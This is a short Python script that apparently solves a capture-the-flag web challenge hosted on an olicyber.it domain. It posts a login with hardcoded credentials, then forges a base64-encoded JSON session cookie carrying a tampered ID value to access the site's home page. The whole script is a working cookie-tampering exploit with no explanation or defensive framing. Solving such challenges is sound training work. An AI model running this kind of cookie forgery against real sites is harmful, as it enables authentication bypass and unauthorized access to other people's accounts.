import requests as r
from base64 import b64decode as b64d, b64encode as b64e
from bs4 import BeautifulSoup as bs
import random
import string
import json

url = 'http://sn4ck-sh3nan1gans.challs.olicyber.it/'

print(r.post(url+'index.php', data={'username': 'samu', 'password': 'samuelef', 'login':''}, allow_redirects=False).text)

stri = '{"ID":' + '190a' + '}'
cookies = {
    'login': b64e(stri.encode()).decode('utf-8'),
}
resp = r.get(url + 'home.php', cookies=cookies)
print(resp.text)